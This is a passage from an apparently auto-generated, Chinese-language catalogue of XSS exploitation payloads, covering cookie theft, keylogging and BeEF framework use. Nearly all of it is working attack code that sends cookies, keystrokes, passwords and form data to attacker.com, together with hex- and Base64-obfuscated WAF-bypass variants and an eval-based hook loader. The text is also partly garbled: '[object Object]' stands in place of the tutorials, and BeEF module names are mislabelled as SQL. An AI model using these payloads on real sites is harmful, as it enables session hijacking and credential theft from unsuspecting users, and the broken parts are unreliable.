xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
</script>
```

使用XHR发送

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| ` var xhr = new XMLHttpRequest(); xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true); xhr.send(); ` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

#### 4. 编码传输

```
<script>
var data = btoa(document.cookie);
new Image().src="http://attacker.com/steal?c="+data;
</script>
```

Base64编码传输

| 片段 | 说明 | 类型 |
|---|---|---|
| `btoa()` | Base64编码函数 | function |

#### 5. 完整利用脚本

```
<script>
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>
```

收集完整信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| ` var img = new Image(); img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent); ` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

**WAF 绕过**

#### 混淆绕过

```
<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
```

变量混淆绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| `var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]

---

### 11. XSS键盘记录

- **id:** `xss-keylogger`
- **分类:** XSS跨站脚本 / 键盘记录
- **tags:** `xss` `keylogger` `credential`

利用XSS记录用户键盘输入

**前置条件**

- 存在存储型XSS
- 目标页面有敏感输入

**利用步骤**

#### 1. 基础键盘记录

```
<script>
document.addEventListener("keypress", function(e){
  new Image().src = "http://attacker.com/log?key=" + e.key;
});
</script>
```

监听键盘按键

| 片段 | 说明 | 类型 |
|---|---|---|
| `addEventListener` | 添加事件监听器 | function |
| `keypress` | 键盘按下事件 | value |
| `e.key` | 按下的键值 | value |

#### 2. 完整键盘记录

```
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>
```

按Enter发送记录

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| ` var buffer = ""; document.addEventListener("keydown", function(e){   if(e.key === "Enter"){     new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);     buffer = "";   } else {     buffer += e.key;   } }); ` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

#### 3. 表单窃取

```
<script>
document.querySelectorAll("input[type=password]").forEach(function(input){
  input.addEventListener("change", function(){
    new Image().src = "http://attacker.com/log?pwd=" + this.value;
  });
});
</script>
```

窃取密码字段

| 片段 | 说明 | 类型 |
|---|---|---|
| `querySelectorAll` | 选择所有匹配元素 | function |
| `input[type=password]` | 密码输入框选择器 | value |
| `change` | 值改变事件 | value |

#### 4. 表单提交劫持

```
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
</script>
```

劫持表单提交

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| ` document.querySelectorAll("form").forEach(function(form){   form.addEventListener("submit", function(e){     var data = new FormData(this);     new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();   }); }); ` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

**WAF 绕过**

#### 混淆版本

```
<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
```

十六进制混淆

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| `var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]

---

### 12. BeEF框架利用

- **id:** `xss-beef`
- **分类:** XSS跨站脚本 / BeEF利用
- **tags:** `xss` `beef` `framework` `exploitation`

使用BeEF框架进行XSS利用

**前置条件**

- 存在XSS漏洞
- 部署BeEF服务器

**利用步骤**

#### 1. 部署BeEF

```
# 安装BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install
./beef

# 默认运行在 http://localhost:3000
# 默认用户名: beef
# 默认密码: beef
```

部署BeEF服务器

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 安装BeEF git clone https://github.com/beefproject/beef cd beef bundle install` | 攻击载荷 | value |

> platform: `linux`

#### 2. 注入Hook脚本

```
<script src="http://attacker.com:3000/hook.js"></script>
注入短版本:
<script src="//attacker.com:3000/hook.js"></script>
```

注入BeEF Hook

| 片段 | 说明 | 类型 |
|---|---|---|
| `hook.js` | BeEF的Hook脚本 | value |
| `attacker.com:3000` | BeEF服务器地址 | domain |

#### 3. 常用命令

```
# BeEF控制台常用命令
# 查看在线僵尸
beef> online_browsers

# 执行命令
beef> run social_engineering fake_notification

# 获取Cookie
beef> run browser get_cookies

# 重定向页面
beef> run browser redirect https://evil.com
```

BeEF控制台命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `# BeEF控制台常用命令 # 查看在线僵尸 beef> online_browsers  # 执行命令 beef> run social_engin` | 攻击载荷 | value |

#### 4. 模块利用

```
# 常用模块
# 社会工程学
- Fake Notification
- Fake Flash Update
- Pretty Theft

# 浏览器攻击
- Get Cookie
- Redirect Browser
- TabNabbing

# 网络攻击
- DNS Spoofing
- Ping Sweep
- Port Scanner
```

BeEF模块列表

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 常用模块 # 社会工程学 - Fake Notification - Fake Flash ` | SQL表达式 | value |
| `Update` | SQL关键字 | keyword |
| ` - Pretty Theft  # 浏览器攻击 - Get Cookie - Redirect Browser - TabNabbing  # 网络攻击 - DNS Spoofing - Ping Sweep - Port Scanner` | SQL表达式 | value |

**WAF 绕过**

#### 混淆Hook URL

```
<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>
```

Base64混淆Hook注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| `eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]
